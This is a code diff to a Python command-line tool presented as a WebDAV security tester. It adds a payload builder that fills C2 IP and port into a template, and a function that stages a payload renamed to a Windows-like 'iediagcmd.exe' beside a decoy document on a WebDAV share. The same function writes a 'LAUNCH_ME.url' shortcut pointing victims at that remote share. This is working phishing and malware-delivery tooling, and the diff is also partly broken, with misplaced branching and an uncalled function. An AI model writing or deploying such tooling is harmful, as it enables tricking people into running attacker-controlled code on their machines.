@@ -37,6 +37,7 @@ def main():
     serve_parser.add_argument("--dir", default="./webdav_root", help="Root directory to serve files from. Default: ./webdav_root")
     serve_parser.add_argument("--host", default="0.0.0.0", help="Host IP to bind the server to. Default: 0.0.0.0")
     serve_parser.add_argument("--port", type=int, default=8080, help="Port to run the server on. Default: 8080")
+    serve_parser.add_argument("--tls", action="store_true", help="Enable TLS/SSL for the server.")
 
     # --- Subparser for the 'test' command ---
     test_parser = subparsers.add_parser("test", help="Run single or list available tests.")
@@ -88,6 +89,13 @@ def main():
     batch_output_group.add_argument('--report-dir', help="Specific directory for Markdown reports.")
     batch_output_group.add_argument('--log-level', default='INFO', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], help='Set the logging level.')
 
+    # --- Subparser for the 'build' command ---
+    build_parser = subparsers.add_parser("build", help="Build payload from template.")
+    build_parser.add_argument('--template', required=True, help='Path to the payload template file.')
+    build_parser.add_argument('--out', required=True, help='Output file for the generated payload source code.')
+    build_parser.add_argument('--var1', required=True, help='Value for placeholder ##V1## (e.g., C2 IP).')
+    build_parser.add_argument('--var2', required=True, help='Value for placeholder ##V2## (e.g., C2 Port).')
+
 
     args = parser.parse_args()
 
@@ -96,7 +104,7 @@ def main():
         logging.getLogger().setLevel(getattr(logging, args.log_level.upper()))
 
     if args.command == "serve":
-        server = DAVServer(root_path=args.dir, host=args.host, port=args.port)
+        server = DAVServer(root_path=args.dir, host=args.host, port=args.port, use_tls=args.tls)
         server.start()
         sys.exit(0)
 
@@ -185,6 +193,23 @@ def main():
 
     logger.info("Enhanced WebDAV Security Tester finished.")
 
+elif args.command == "build":
+    try:
+        with open(args.template, 'r') as f:
+            tpl_data = f.read()
+
+        p_code = tpl_data.replace('##V1##', args.var1).replace('##V2##', str(args.var2))
+
+        with open(args.out, 'w') as f:
+            f.write(p_code)
+        print(f"Payload source generated: {args.out}")
+    except FileNotFoundError:
+        logger.error(f"Template file not found: {args.template}")
+        sys.exit(1)
+    except Exception as e:
+        logger.critical(f"An error occurred during payload generation: {e}", exc_info=True)
+        sys.exit(1)
+
 if __name__ == "__main__":
     # Add a simple check for dependent files in the same directory for easier execution if not installed.
     # This is a developer convenience, not a substitute for proper packaging.
@@ -201,3 +226,45 @@ if __name__ == "__main__":
     import time
 
     main()
+
+
+def generate_attack_package(p_path, d_path, c2_url):
+    # 1. Create webdav_root/reports if not exists
+    # 2. Copy payload and decoy to webdav_root/reports
+    # 3. Rename payload to 'iediagcmd.exe'
+    # 4. Generate .url file content
+    url_content = f"""
+    [InternetShortcut]
+    URL=file:///\\{c2_url}\\reports\\decoy.pdf
+    WorkingDirectory=\\\\{c2_url}\\reports\\
+    IconFile=\\\\{c2_url}\\reports\\icon.ico
+    """
+    # 5. Write content to 'LAUNCH_ME.url' in project root
+    # 6. Print status to user: "Package generated. Run 'python ewt_cli.py serve'"
+    webdav_reports_path = os.path.join("webdav_root", "reports")
+    os.makedirs(webdav_reports_path, exist_ok=True)
+
+    try:
+        from shutil import copyfile
+        # Copy and rename payload
+        payload_dest = os.path.join(webdav_reports_path, "iediagcmd.exe")
+        copyfile(p_path, payload_dest)
+
+        # Copy decoy document
+        decoy_filename = os.path.basename(d_path)
+        decoy_dest = os.path.join(webdav_reports_path, decoy_filename)
+        copyfile(d_path, decoy_dest)
+
+        # Create the .url file
+        with open("LAUNCH_ME.url", "w") as f:
+            f.write(url_content)
+
+        print("Package generated successfully.")
+        print(f"Payload and decoy copied to {webdav_reports_path}")
+        print("LAUNCH_ME.url created in the project root.")
+        print("Run 'python ewt_cli.py serve' to host the files.")
+
+    except FileNotFoundError as e:
+        print(f"Error: {e}. Please check your file paths.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
